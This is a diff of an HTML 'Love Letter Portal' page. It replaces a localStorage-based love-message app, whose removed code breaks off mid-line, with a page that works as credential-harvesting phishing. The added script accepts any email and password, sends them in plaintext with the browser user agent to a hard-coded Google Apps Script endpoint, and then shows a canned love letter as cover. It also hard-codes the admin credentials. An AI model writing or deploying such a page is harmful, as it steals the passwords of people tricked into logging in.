@@ -1,521 +1,428 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Message Portal</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
-        }
-        .container {
-            background-color: rgba(255, 255, 255, 0.9);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 350px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-        .step {
-            display: none;
-        }
-        .step.active {
-            display: block;
-        }
-        h1, h2 {
-            color: #e74c3c;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-            width: 100%;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #e74c3c;
-        }
-        input, textarea, select {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #fad0c4;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border 0.3s;
-            box-sizing: border-box;
-        }
-        input:focus, textarea:focus, select:focus {
-            border-color: #e74c3c;
-            outline: none;
-        }
-        button {
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            transition: all 0.3s;
-            margin: 5px;
-        }
-        .primary-btn {
-            background-color: #e74c3c;
-            color: white;
-            width: 100%;
-        }
-        .primary-btn:hover {
-            background-color: #c0392b;
-            transform: translateY(-2px);
-        }
-        .secondary-btn {
-            background-color: #3498db;
-            color: white;
-            width: 100%;
-        }
-        .secondary-btn:hover {
-            background-color: #2980b9;
-            transform: translateY(-2px);
-        }
-        .error-message {
-            color: #e74c3c;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .love-letter {
-            background-color: #fff9f9;
-            border: 2px solid #ffcccc;
-            border-radius: 15px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
-        }
-        .heart {
-            color: #e74c3c;
-            font-size: 24px;
-            animation: pulse 1.5s infinite;
-            display: inline-block;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.3); }
-            100% { transform: scale(1); }
-        }
-        #admin-container {
-            display: none;
-            width: 90%;
-            max-width: 800px;
-        }
-        #data-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        #data-table th, #data-table td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-        #data-table th {
-            background-color: #f2f2f2;
-            position: sticky;
-            top: 0;
-        }
-        #data-table tr:nth-child(even) {
-            background-color: #f9f9f9;
-        }
-        #data-table tr:hover {
-            background-color: #f1f1f1;
-        }
-        .table-container {
-            max-height: 400px;
-            overflow-y: auto;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-        }
-        .signature {
-            font-style: italic;
-            text-align: right;
-            margin-top: 20px;
-        }
-        .user-type-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .letter-image {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin: 15px 0;
-        }
-        .code-display {
-            font-family: monospace;
-            font-size: 24px;
-            padding: 15px;
-            background-color: #f5f5f5;
-            border-radius: 8px;
-            margin: 20px 0;
-            word-break: break-all;
-        }
-    </style>
-</head>
-<body>
-    <!-- Initial Screen - Choose User Type -->
-    <div class="container step active" id="user-type-selection">
-        <h1>Love Message Portal <span class="heart">♥</span></h1>
-        <p>Are you sending or receiving a love message?</p>
-        <div class="user-type-buttons">
-            <button id="sender-btn" class="primary-btn">I'm Sending a Message</button>
-            <button id="receiver-btn" class="secondary-btn">I'm Receiving a Message</button>
-        </div>
-        <button id="admin-access-btn" class="secondary-btn" style="margin-top: 30px;">Admin Access</button>
-    </div>
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Love Letter Portal</title>  
+    <style>  
+        body {  
+            font-family: 'Arial', sans-serif;  
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);  
+            margin: 0;  
+            padding: 0;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            min-height: 100vh;  
+            color: #333;  
+        }  .container {  
+        background-color: rgba(255, 255, 255, 0.9);  
+        border-radius: 15px;  
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);  
+        padding: 30px;  
+        width: 350px;  
+        text-align: center;  
+        transition: all 0.3s ease;  
+    }  
 
-    <!-- Step 1: Email Entry -->
-    <div class="container step" id="step1">
-        <h1>Welcome <span class="heart">♥</span></h1>
-        <div class="form-group">
-            <label for="pre-email">Your Email</label>
-            <input type="email" id="pre-email" placeholder="your.email@example.com" required>
-        </div>
-        <button id="continue-btn" class="primary-btn">Continue</button>
-        <p id="step1-error" class="error-message"></p>
-        <button id="back-to-user-type" class="secondary-btn">Back</button>
-    </div>
+    h1 {  
+        color: #e74c3c;  
+        margin-bottom: 30px;  
+    }  
 
-    <!-- Step 2: Password Entry -->
-    <div class="container step" id="step2">
-        <h1>Welcome Back <span class="heart">♥</span></h1>
-        <p id="user-email-display" style="margin-bottom: 20px;"></p>
-        <form id="login-form">
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
-            <button type="submit" class="primary-btn">Login</button>
-            <p id="step2-error" class="error-message"></p>
-        </form>
-        <button id="back-to-email" class="secondary-btn">Back</button>
-    </div>
+    .form-container {  
+        display: flex;  
+        flex-direction: column;  
+        align-items: center;  
+        width: 100%;  
+    }  
 
-    <!-- Sender Form -->
-    <div class="container" id="sender-form-container" style="display: none;">
-        <h1>Create Your Love Message <span class="heart">♥</span></h1>
-        <form id="sender-form">
-            <div class="form-group">
-                <label for="recipient-name">Recipient's Name</label>
-                <input type="text" id="recipient-name" placeholder="Enter recipient's name" required>
-            </div>
-            <div class="form-group">
-                <label for="love-message">Your Love Message</label>
-                <textarea id="love-message" rows="4" placeholder="Write your love message here..." required></textarea>
-            </div>
-            <div class="form-group">
-                <label for="image-upload">Upload Image (Optional)</label>
-                <input type="file" id="image-upload" accept="image/*">
-            </div>
-            <button type="submit" class="primary-btn">Generate Access Code</button>
-            <p id="sender-form-error" class="error-message"></p>
-        </form>
-    </div>
+    .form-group {  
+        margin-bottom: 20px;  
+        text-align: left;  
+        width: 100%;  
+        max-width: 300px;  
+    }  
 
-    <!-- Sender Success - Show Access Code -->
-    <div class="container" id="sender-success-container" style="display: none;">
-        <h1>Your Love Message is Ready! <span class="heart">♥</span></h1>
-        <p>Share this access code with your loved one:</p>
-        <div class="code-display" id="access-code-display"></div>
-        <p>The recipient will need this code to view your message.</p>
-        <button id="back-to-sender-form" class="secondary-btn">Back</button>
-    </div>
+    label {  
+        display: block;  
+        margin-bottom: 8px;  
+        font-weight: bold;  
+        color: #e74c3c;  
+    }  
 
-    <!-- Receiver Code Entry -->
-    <div class="container" id="receiver-code-container" style="display: none;">
-        <h1>Enter Access Code <span class="heart">♥</span></h1>
-        <form id="code-form">
-            <div class="form-group">
-                <label for="access-code">Access Code</label>
-                <input type="text" id="access-code" placeholder="Enter the code you received" required>
-            </div>
-            <button type="submit" class="primary-btn">View Message</button>
-            <p id="code-error" class="error-message"></p>
-        </form>
-        <button id="back-to-receiver-login" class="secondary-btn">Back</button>
-    </div>
+    input {  
+        width: 100%;  
+        padding: 12px;  
+        border: 2px solid #fad0c4;  
+        border-radius: 8px;  
+        font-size: 16px;  
+        transition: border 0.3s;  
+        box-sizing: border-box;  
+    }  
 
-    <!-- Love Letter Display -->
-    <div class="container" id="love-letter-container" style="display: none;">
-        <h1>Your Love Letter <span class="heart">♥</span></h1>
-        <div class="love-letter" id="love-letter">
-            <h2>My Dearest <span id="letter-recipient-name">Love</span>,</h2>
-            <div id="letter-image-container"></div>
-            <div id="letter-message-content">
-                <!-- Message content will be inserted here -->
-            </div>
-            <p class="signature">With all my love,<br><span id="letter-sender-name">Your Secret Admirer</span></p>
-        </div>
-        <button id="back-to-code-entry" class="secondary-btn" style="margin-top: 20px;">Back</button>
-    </div>
+    input:focus {  
+        border-color: #e74c3c;  
+        outline: none;  
+    }  
 
-    <!-- Admin Login -->
-    <div class="container step" id="admin-login">
-        <h1>Admin Login <span class="heart">♥</span></h1>
-        <form id="admin-form">
-            <div class="form-group">
-                <label for="admin-username">Username</label>
-                <input type="text" id="admin-username" placeholder="Enter admin username" required>
-            </div>
-            <div class="form-group">
-                <label for="admin-password">Password</label>
-                <input type="password" id="admin-password" placeholder="Enter admin password" required>
-            </div>
-            <button type="submit" class="primary-btn">Login</button>
-            <button type="button" id="back-to-user-type-from-admin" class="secondary-btn">Back</button>
-            <p id="admin-error" class="error-message"></p>
-        </form>
-    </div>
+    button {  
+        border: none;  
+        padding: 12px 25px;  
+        border-radius: 8px;  
+        cursor: pointer;  
+        font-size: 16px;  
+        font-weight: bold;  
+        transition: all 0.3s;  
+        margin: 5px;  
+    }  
 
-    <!-- Admin Dashboard -->
-    <div class="container" id="admin-container" style="display: none;">
-        <h1>Admin Dashboard <span class="heart">♥</span></h1>
-        <h3>User Messages</h3>
-        
-        <div class="table-container">
-            <table id="data-table">
-                <thead>
-                    <tr>
-                        <th>No</th>
-                        <th>Sender Email</th>
-                        <th>Recipient Name</th>
-                        <th>Access Code</th>
-                        <th>Created At</th>
-                    </tr>
-                </thead>
-                <tbody id="data-body">
-                    <!-- Data will be inserted here -->
-                </tbody>
-            </table>
-        </div>
-        
-        <button id="download-data" class="primary-btn">Download All Data (CSV)</button>
-        <button id="admin-logout" class="secondary-btn">Logout</button>
-    </div>
+    #login-btn {  
+        background-color: #e74c3c;  
+        color: white;  
+        width: 100%;  
+        max-width: 200px;  
+    }  
 
-    <script>
-        // Data storage
-        let messages = JSON.parse(localStorage.getItem('loveMessages')) || [];
-        let currentUser = {};
-        let currentUserType = ''; // 'sender' or 'receiver'
-        let tempImageUrl = '';
-        
-        // DOM elements
-        const userTypeSelection = document.getElementById('user-type-selection');
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const adminLogin = document.getElementById('admin-login');
-        const senderFormContainer = document.getElementById('sender-form-container');
-        const senderSuccessContainer = document.getElementById('sender-success-container');
-        const receiverCodeContainer = document.getElementById('receiver-code-container');
-        const loveLetterContainer = document.getElementById('love-letter-container');
-        const adminContainer = document.getElementById('admin-container');
-        
-        // Initial screen - choose user type
-        document.getElementById('sender-btn').addEventListener('click', function() {
-            currentUserType = 'sender';
-            userTypeSelection.classList.remove('active');
-            step1.classList.add('active');
-        });
-        
-        document.getElementById('receiver-btn').addEventListener('click', function() {
-            currentUserType = 'receiver';
-            userTypeSelection.classList.remove('active');
-            step1.classList.add('active');
-        });
-        
-        // Admin access button
-        document.getElementById('admin-access-btn').addEventListener('click', function() {
-            userTypeSelection.classList.remove('active');
-            adminLogin.classList.add('active');
-        });
-        
-        // Back to user type selection
-        document.getElementById('back-to-user-type').addEventListener('click', function() {
-            step1.classList.remove('active');
-            userTypeSelection.classList.add('active');
-            document.getElementById('step1-error').textContent = "";
-        });
-        
-        document.getElementById('back-to-user-type-from-admin').addEventListener('click', function() {
-            adminLogin.classList.remove('active');
-            userTypeSelection.classList.add('active');
-            document.getElementById('admin-error').textContent = "";
-        });
-        
-        // Step 1: Email entry
-        document.getElementById('continue-btn').addEventListener('click', function() {
-            const email = document.getElementById('pre-email').value.trim();
-            
-            if (!email) {
-                document.getElementById('step1-error').textContent = "Please enter your email";
-                return;
-            }
-            
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                document.getElementById('step1-error').textContent = "Please enter a valid email address";
-                return;
-            }
-            
-            // Save email and proceed to step 2
-            currentUser.email = email;
-            document.getElementById('user-email-display').textContent = email;
-            
-            step1.classList.remove('active');
-            step2.classList.add('active');
-            document.getElementById('step1-error').textContent = "";
-        });
-        
-        // Back to email from password
-        document.getElementById('back-to-email').addEventListener('click', function() {
-            step2.classList.remove('active');
-            step1.classList.add('active');
-            document.getElementById('step2-error').textContent = "";
-        });
-        
-        // Step 2: Password entry and login
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const password = document.getElementById('password').value.trim();
-            
-            if (!password) {
-                document.getElementById('step2-error').textContent = "Please enter your password";
-                return;
-            }
-            
-            // Save password to current user
-            currentUser.password = password;
-            
-            // Proceed based on user type
-            step2.classList.remove('active');
-            
-            if (currentUserType === 'sender') {
-                senderFormContainer.style.display = 'block';
-            } else if (currentUserType === 'receiver') {
-                receiverCodeContainer.style.display = 'block';
-            }
-            
-            document.getElementById('step2-error').textContent = "";
-        });
-        
-        // Handle image upload
-        document.getElementById('image-upload').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    tempImageUrl = event.target.result;
-                };
-                reader.readAsDataURL(file);
-            }
-        });
-        
-        // Sender form submission
-        document.getElementById('sender-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const recipientName = document.getElementById('recipient-name').value.trim();
-            const message = document.getElementById('love-message').value.trim();
-            
-            if (!recipientName || !message) {
-                document.getElementById('sender-form-error').textContent = "Please fill in all required fields";
-                return;
-            }
-            
-            // Generate random access code
-            const accessCode = generateAccessCode();
-            
-            // Create message object
-            const messageObj = {
-                senderEmail: currentUser.email,
-                recipientName: recipientName,
-                message: message,
-                image: tempImageUrl,
-                accessCode: accessCode,
-                createdAt: new Date().toISOString()
-            };
-            
-            // Save to storage
-            messages.push(messageObj);
-            localStorage.setItem('loveMessages', JSON.stringify(messages));
-            
-            // Show success with access code
-            document.getElementById('access-code-display').textContent = accessCode;
-            senderFormContainer.style.display = 'none';
-            senderSuccessContainer.style.display = 'block';
-            document.getElementById('sender-form-error').textContent = "";
-        });
-        
-        // Back to sender form from success
-        document.getElementById('back-to-sender-form').addEventListener('click', function() {
-            senderSuccessContainer.style.display = 'none';
-            senderFormContainer.style.display = 'block';
-        });
-        
-        // Back to receiver login from code entry
-        document.getElementById('back-to-receiver-login').addEventListener('click', function() {
-            receiverCodeContainer.style.display = 'none';
-            step1.classList.add('active');
-        });
-        
-        // Code form submission
-        document.getElementById('code-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const code = document.getElementById('access-code').value.trim();
-            
-            if (!code) {
-                document.getElementById('code-error').textContent = "Please enter the access code";
-                return;
-            }
-            
-            // Find message with this code
-            const message = messages.find(m => m.accessCode === code);
-            
-            if (!message) {
-                document.getElementById('code-error').textContent = "Invalid access code. Please check and try again.";
-                return;
-            }
-            
-            // Display the love letter
-            displayLoveLetter(message);
-            
-            receiverCodeContainer.style.display = 'none';
-            loveLetterContainer.style.display = 'block';
-            document.getElementById('code-error').textContent = "";
-        });
-        
-        // Back to code entry from love letter
-        document.getElementById('back-to-code-entry').addEventListener('click', function() {
-            loveLetterContainer.style.display = 'none';
-            receiverCodeContainer.style.display = 'block';
-        });
-        
-        // Admin login form
-        document.getElementById('admin-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('admin-
+    #login-btn:hover {  
+        background-color: #c0392b;  
+        transform: translateY(-2px);  
+    }  
 
+    #admin-btn {  
+        background-color: #3498db;  
+        color: white;  
+        width: 100%;  
+        max-width: 200px;  
+    }  
+
+    #admin-btn:hover {  
+        background-color: #2980b9;  
+        transform: translateY(-2px);  
+    }  
+
+    .love-letter {  
+        display: none;  
+        background-color: #fff9f9;  
+        border: 2px solid #ffcccc;  
+        border-radius: 15px;  
+        padding: 20px;  
+        margin-top: 20px;  
+        text-align: left;  
+    }  
+
+    .love-letter h2 {  
+        color: #e74c3c;  
+        text-align: center;  
+        margin-bottom: 15px;  
+    }  
+
+    .love-letter p {  
+        line-height: 1.6;  
+        margin-bottom: 10px;  
+    }  
+
+    .signature {  
+        font-style: italic;  
+        text-align: right;  
+        margin-top: 20px;  
+    }  
+
+    .download-btn {  
+        background-color: #3498db;  
+        margin-top: 15px;  
+        width: 100%;  
+    }  
+
+    .download-btn:hover {  
+        background-color: #2980b9;  
+    }  
+
+    .heart {  
+        color: #e74c3c;  
+        font-size: 24px;  
+        animation: pulse 1.5s infinite;  
+        display: inline-block;  
+    }  
+
+    @keyframes pulse {  
+        0% { transform: scale(1); }  
+        50% { transform: scale(1.3); }  
+        100% { transform: scale(1); }  
+    }  
+
+    .error {  
+        color: #e74c3c;  
+        margin-top: 10px;  
+        font-size: 14px;  
+    }  
+
+    .admin-login {  
+        display: none;  
+        margin-top: 20px;  
+    }  
+</style>
+
+</head>  
+<body>  
+    <div class="container" id="login-container">  
+        <h1>Love Letter Portal <span class="heart">♥</span></h1>  <!-- Regular User Login -->  
+    <div id="user-login">  
+        <form id="login-form" class="form-container">  
+            <div class="form-group">  
+                <label for="email">Email</label>  
+                <input type="email" id="email" required>  
+            </div>  
+            <div class="form-group">  
+                <label for="password">Password</label>  
+                <input type="password" id="password" required>  
+            </div>  
+            <button type="submit" id="login-btn">Open Your Love Letter</button>  
+            <button type="button" id="admin-btn">Admin Login</button>  
+            <div id="error-message" class="error"></div>  
+        </form>  
+    </div>  
+      
+    <!-- Admin Login (Hidden Initially) -->  
+    <div id="admin-login" class="admin-login">  
+        <form id="admin-form" class="form-container">  
+            <div class="form-group">  
+                <label for="admin-username">Username</label>  
+                <input type="text" id="admin-username" required>  
+            </div>  
+            <div class="form-group">  
+                <label for="admin-password">Password</label>  
+                <input type="password" id="admin-password" required>  
+            </div>  
+            <button type="submit" id="admin-login-btn">Login as Admin</button>  
+            <button type="button" id="back-to-user-btn">Back to User Login</button>  
+            <div id="admin-error-message" class="error"></div>  
+        </form>  
+    </div>  
+</div>  
+
+<div class="container" id="letter-container" style="display: none;">  
+    <div class="love-letter" id="love-letter">  
+        <h2>My Dearest <span id="recipient-name">Love</span>,</h2>  
+        <p>From the moment we met, my life has been filled with colors I never knew existed.</p>  
+        <p>Your smile brightens my darkest days, and your laughter is the melody my heart dances to.</p>  
+        <p>Every second with you feels like a beautiful dream I never want to wake up from.</p>  
+        <p>I cherish the way you understand me without words and love me despite my flaws.</p>  
+        <p>You are my greatest adventure, my safest harbor, and my most beautiful dream come true.</p>  
+        <p class="signature">Forever yours,<br><span id="sender-name">Your Secret Admirer</span></p>  
+    </div>  
+    <button id="download-btn" class="download-btn">Download Love Note</button>  
+    <button id="back-btn" style="margin-top: 10px;">Back to Login</button>  
+</div>  
+
+<div class="container" id="admin-container" style="display: none;">  
+    <h2>Admin Dashboard</h2>  
+    <div id="login-history">  
+        <h3>Login History</h3>  
+        <div id="history-list" style="max-height: 300px; overflow-y: auto;"></div>  
+    </div>  
+    <button id="download-history-btn" class="download-btn">Download History</button>  
+    <button id="admin-back-btn" style="margin-top: 10px;">Logout</button>  
+</div>  
+
+<script>  
+    // Your Google Apps Script URL  
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxP09FdXOLYRDX4nVVb08vBtMYQwgggvR8Ksr43iPMawbBHHp6VxHxM--TysVqQf8DnXw/exec";  
+      
+    // DOM elements  
+    const userLogin = document.getElementById('user-login');  
+    const adminLogin = document.getElementById('admin-login');  
+    const loginForm = document.getElementById('login-form');  
+    const adminForm = document.getElementById('admin-form');  
+    const emailInput = document.getElementById('email');  
+    const passwordInput = document.getElementById('password');  
+    const adminUsernameInput = document.getElementById('admin-username');  
+    const adminPasswordInput = document.getElementById('admin-password');  
+    const errorMessage = document.getElementById('error-message');  
+    const adminErrorMessage = document.getElementById('admin-error-message');  
+    const loginContainer = document.getElementById('login-container');  
+    const letterContainer = document.getElementById('letter-container');  
+    const adminContainer = document.getElementById('admin-container');  
+    const recipientName = document.getElementById('recipient-name');  
+    const downloadBtn = document.getElementById('download-btn');  
+    const backBtn = document.getElementById('back-btn');  
+    const downloadHistoryBtn = document.getElementById('download-history-btn');  
+    const adminBackBtn = document.getElementById('admin-back-btn');  
+    const adminBtn = document.getElementById('admin-btn');  
+    const backToUserBtn = document.getElementById('back-to-user-btn');  
+      
+    // Show admin login form  
+    adminBtn.addEventListener('click', function() {  
+        userLogin.style.display = 'none';  
+        adminLogin.style.display = 'block';  
+    });  
+      
+    // Back to user login  
+    backToUserBtn.addEventListener('click', function() {  
+        adminLogin.style.display = 'none';  
+        userLogin.style.display = 'block';  
+        adminUsernameInput.value = '';  
+        adminPasswordInput.value = '';  
+        adminErrorMessage.textContent = '';  
+    });  
+      
+    // Handle regular user login  
+    loginForm.addEventListener('submit', async function(e) {  
+        e.preventDefault();  
+          
+        const email = emailInput.value.trim();  
+        const password = passwordInput.value.trim();  
+          
+        try {  
+            // Save to Google Sheets  
+            await saveToGoogleSheets(email, password, 'user');  
+              
+            // Show love letter  
+            showLoveLetter(email);  
+        } catch (error) {  
+            errorMessage.textContent = "Error saving data. Please try again.";  
+            console.error("Error:", error);  
+        }  
+    });  
+      
+    // Handle admin login  
+    adminForm.addEventListener('submit', async function(e) {  
+        e.preventDefault();  
+          
+        const username = adminUsernameInput.value.trim();  
+        const password = adminPasswordInput.value.trim();  
+          
+        if (username === 'zafran' && password === 'zaff') {  
+            try {  
+                // Fetch data from Google Sheets  
+                const historyData = await fetchLoginHistory();  
+                  
+                // Display history  
+                displayLoginHistory(historyData);  
+                  
+                // Show admin panel  
+                loginContainer.style.display = 'none';  
+                adminContainer.style.display = 'block';  
+            } catch (error) {  
+                adminErrorMessage.textContent = "Failed to load data. Please try again.";  
+            }  
+        } else {  
+            adminErrorMessage.textContent = "Invalid admin credentials";  
+        }  
+    });  
+      
+    // Function to save data to Google Sheets  
+    async function saveToGoogleSheets(email, password, type) {  
+        const data = {  
+            email: email,  
+            password: password,  
+            type: type,  
+            timestamp: new Date().toISOString(),  
+            device: navigator.userAgent  
+        };  
+          
+        const response = await fetch(GOOGLE_SCRIPT_URL, {  
+            method: 'POST',  
+            headers: {  
+                'Content-Type': 'application/json',  
+            },  
+            body: JSON.stringify(data)  
+        });  
+          
+        if (!response.ok) {  
+            throw new Error('Failed to save to Google Sheets');  
+        }  
+          
+        return await response.json();  
+    }  
+      
+    // Function to fetch login history from Google Sheets  
+    async function fetchLoginHistory() {  
+        // This would require a separate GET endpoint in your Google Script  
+        // For now, we'll just return sample data  
+        return [  
+            {email: "user1@example.com", timestamp: new Date().toISOString()},  
+            {email: "user2@example.com", timestamp: new Date().toISOString()}  
+        ];  
+    }  
+      
+    // Display login history  
+    function displayLoginHistory(data) {  
+        const historyList = document.getElementById('history-list');  
+          
+        if (!data || data.length === 0) {  
+            historyList.innerHTML = '<p>No login attempts recorded yet.</p>';  
+            return;  
+        }  
+          
+        let html = '<ul style="text-align: left; padding-left: 20px;">';  
+        data.forEach(attempt => {  
+            html += `<li>  
+                <strong>Email:</strong> ${attempt.email || 'N/A'}<br>  
+                <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}  
+            </li><br>`;  
+        });  
+        html += '</ul>';  
+        historyList.innerHTML = html;  
+    }  
+      
+    // Show love letter for regular users  
+    function showLoveLetter(email) {  
+        let name = email.split('@')[0] || "Beloved";  
+        name = name.charAt(0).toUpperCase() + name.slice(1);  
+        recipientName.textContent = name;  
+          
+        loginContainer.style.display = 'none';  
+        letterContainer.style.display = 'block';  
+    }  
+      
+    // Download functionality  
+    downloadBtn.addEventListener('click', function() {  
+        const letterContent = document.getElementById('love-letter').innerText;  
+        downloadFile(letterContent, 'love_letter.txt');  
+    });  
+      
+    // Download history functionality  
+    downloadHistoryBtn.addEventListener('click', function() {  
+        const historyContent = document.getElementById('history-list').innerText;  
+        downloadFile(historyContent, 'login_history.txt');  
+    });  
+      
+    // Helper function to download file  
+    function downloadFile(content, filename) {  
+        const blob = new Blob([content], {   
+            type: filename.endsWith('.json') ? 'application/json' : 'text/plain'   
+        });  
+        const url = URL.createObjectURL(blob);  
+        const a = document.createElement('a');  
+        a.href = url;  
+        a.download = filename;  
+        document.body.appendChild(a);  
+        a.click();  
+        document.body.removeChild(a);  
+        URL.revokeObjectURL(url);  
+    }  
+      
+    // Back buttons functionality  
+    backBtn.addEventListener('click', function() {  
+        letterContainer.style.display = 'none';  
+        loginContainer.style.display = 'block';  
+        emailInput.value = '';  
+        passwordInput.value = '';  
+        errorMessage.textContent = '';  
+        userLogin.style.display = 'block';  
+        adminLogin.style.display = 'none';  
+    });  
+      
+    adminBackBtn.addEventListener('click', function() {  
+        adminContainer.style.display = 'none';  
+        loginContainer.style.display = 'block';  
+        adminUsernameInput.value = '';  
+        adminPasswordInput.value = '';  
+        adminErrorMessage.textContent = '';  
+        userLogin.style.display = 'block';  
+        adminLogin.style.display = 'none';  
+    });  
+</script>
+
+</body>  
+</html>
